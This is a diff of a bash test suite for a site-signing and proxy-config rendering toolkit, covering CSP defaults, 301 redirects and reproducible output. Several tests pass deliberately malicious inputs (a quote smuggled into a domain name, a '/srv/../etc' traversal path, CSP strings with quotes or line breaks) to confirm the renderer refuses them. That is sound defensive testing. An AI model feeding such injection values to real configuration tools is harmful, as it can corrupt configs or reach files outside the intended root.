+cp -r "$t/d1" "$t/d7"; echo x >> "$t/d7/helfa.org-0.0.1.spdx.json"; red "signatures-check: a changed file is red" "$here/site-signaturen-pruefen.sh" "$t/d7" "$t/rel.pub.asc" helfa.org-0.0.1
+red "signatures-check: wrong public key is red" "$here/site-signaturen-pruefen.sh" "$t/d1" "$t/other.pub" helfa.org-0.0.1
 rm -rf "$t/d2"; cp -r "$t/dist" "$t/d2"
-red "sign: wrong public key for the check is red" env "GPG_PRIVATE_KEY=$(cat "$t/rel.sec.asc")" "$here/site-signieren.sh" "$t/d2" "$t/a.txt" "$t/a.txt.asc" "$t/appr.ring" "$t/allowed" run-0001 "$t/other.pub"
+red "sign: wrong public key for the check is red" env "GPG_PRIVATE_KEY=$(cat "$t/rel.sec.asc")" "$S" "$t/d2" "$t/a.txt" "$t/a.txt.asc" "$t/appr.ring" "$t/allowed" run-0001 "$t/other.pub" "$t/src"
 
-# --- templates and pages
-grn "pages: committed pages equal the generator output" bash -c "'$root/templates/site/gen-pages.sh' '$t/gen' && diff -r '$t/gen/sites' '$root/templates/site/sites' && diff -r '$t/gen/port80' '$root/templates/site/port80'"
-for d in freesynergy.net helfa.org freeplanetearth.org; do
-  grn "pages: $d passes the folder check" "$here/site-bauen.sh" check "$root/templates/site/sites/$d"
-  grep -q "http-equiv=\"refresh\" content=\"0;url=https://$d/\"" "$root/templates/site/port80/$d/index.html" && grep -q "href=\"https://$d/\"" "$root/templates/site/port80/$d/index.html" && ok "port 80 page of $d: meta refresh and link" || bad "port 80 page of $d"
-  grep -q 'TODO(user)' "$root/templates/site/sites/$d/index.html" && ok "$d: TODO for the real contents is marked" || bad "$d: TODO marker"
-done
+# --- templates
+T="$root/templates/site"
+[ ! -e "$T/sites" ] && [ ! -e "$T/port80" ] && [ ! -e "$T/gen-pages.sh" ] && ok "templates: no placeholder pages are kept in git" || bad "templates: placeholder pages are back"
 export SITE1=freesynergy.net SITE2=helfa.org SITE3=freeplanetearth.org ACME_EMAIL=admin@helfa.org
-R="$root/templates/site/render.sh"
+R="$T/render.sh"
 grn "render: staging is the default" bash -c "'$R' '$t/s.kdl' >/dev/null && grep -q 'staging #true' '$t/s.kdl' && ! grep -q '@[A-Z0-9_]*@' '$t/s.kdl'"
 grn "render: production" bash -c "'$R' --production '$t/p.kdl' >/dev/null && grep -q 'staging #false' '$t/p.kdl'"
-grn "render: port 80 has no redirect filter, serves pages" bash -c "! grep -q 'type \"redirect\"' '$t/s.kdl' && grep -q '/_port80/helfa.org' '$t/s.kdl'"
-grn "render: install-pages" bash -c "WEBROOT='$t/www' '$R' --install-pages '$t/i.kdl' >/dev/null && test -f '$t/www/helfa.org/de/index.html' && test -f '$t/www/_port80/helfa.org/index.html'"
+grn "render: port 80 is a real 301 redirect (namespace + redirect filter), no page served" bash -c "grep -q 'type \"redirect\"' '$t/s.kdl' && grep -q 'status-code 301' '$t/s.kdl' && grep -q 'namespace \"redirect\"' '$t/s.kdl' && ! grep -q '_port80' '$t/s.kdl'"
+grn "render: roots end in /current (what the delivery step swaps)" bash -c "grep -c 'root \"/srv/www/[a-z.]*/current\"' '$t/s.kdl' | grep -qx 3"
+grn "render: strict CSP default on every site" bash -c "[ \$(grep -c \"default-src 'none'\" '$t/s.kdl') = 3 ] && ! grep -q 'script-src' '$t/s.kdl'"
+grn "render: CSP_MODE2=passthrough changes only that site (and warns)" bash -c "CSP_MODE2=passthrough '$R' '$t/c.kdl' 2>'$t/w' >/dev/null && [ \$(grep -c \"script-src 'self'\" '$t/c.kdl') = 1 ] && [ \$(grep -c \"default-src 'none'\" '$t/c.kdl') = 2 ] && grep -q WARNING '$t/w'"
+grn "render: CSP3 replaces the policy of site 3" bash -c "CSP3=\"default-src 'self'; script-src 'self' https://cdn.example\" '$R' '$t/c3.kdl' >/dev/null && grep -q 'https://cdn.example' '$t/c3.kdl'"
+red "render: a quote in a CSP is refused" env CSP1='default-src "x"' "$R" "$t/x.kdl"
+red "render: a line break in a CSP is refused" env CSP1=$'a\nb' "$R" "$t/x.kdl"
+red "render: a marker in a CSP is refused" env CSP1='@WEBROOT@' "$R" "$t/x.kdl"
+red "render: unknown CSP mode is refused" env CSP_MODE1=wild "$R" "$t/x.kdl"
+grn "render: writes <file>.sha256 that checks, and renders the same bytes twice" bash -c "'$R' '$t/r1.kdl' >/dev/null && '$R' '$t/r2.kdl' >/dev/null && (cd '$t' && sha256sum --check --quiet r1.kdl.sha256) && cmp '$t/r1.kdl' '$t/r2.kdl'"
+grn "render: --http-only (first start) has no ACME and no TLS" bash -c "'$R' --http-only '$t/h.kdl' >/dev/null && ! grep -q 'acme' '$t/h.kdl' && ! grep -q 'protocol \"https\"' '$t/h.kdl' && grep -q '/current\"' '$t/h.kdl'"
+red "render: --install-pages is gone (no unchecked copy from git)" "$R" --install-pages "$t/x.kdl"
 red "render: quote in a domain refused" env SITE2='evil".org' "$R" "$t/x.kdl"
 red "render: two equal domains refused" env SITE2=helfa.org SITE3=helfa.org "$R" "$t/x.kdl"
 red "render: path in WEBROOT refused" env WEBROOT='/srv/../etc' "$R" "$t/x.kdl"
-red "render: domain without pages refused with --install-pages" env SITE1=other.org WEBROOT="$t/www2" "$R" --install-pages "$t/x.kdl"
+if [ -n "${ZENTINEL_BIN:-}" ]; then for f in s p h; do grn "zentinel test -c on the rendering $f" "$ZENTINEL_BIN" test -c "$t/$f.kdl"; done; fi
 exit "$fail"
